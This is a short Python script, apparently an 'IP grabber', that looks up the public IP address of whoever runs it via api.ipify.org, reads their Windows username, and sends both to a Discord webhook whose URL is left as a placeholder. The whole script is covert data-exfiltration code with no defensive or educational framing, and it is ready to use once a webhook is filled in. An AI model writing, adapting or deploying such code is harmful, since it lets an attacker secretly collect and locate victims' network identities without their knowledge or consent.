import os, discord_webhook
from urllib.request import Request, urlopen
dcw ='WEBHOOK_HERE'
try:
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
except:
    exit(0)
u, webhook = os.getenv("UserName"), discord_webhook.DiscordWebhook(url=dcw)
embed = discord_webhook.DiscordEmbed(title=f'IP from {u}', color='0a0a0a', description=f'```{ip}```')
embed.set_timestamp()
embed.set_footer(text='Made by Foolian', icon_url='https://cdn.discordapp.com/avatars/737401756698411058/93c2ef19aa37de8053558dcf4849f289.webp?size=1024')
webhook.add_embed(embed)
response = webhook.execute()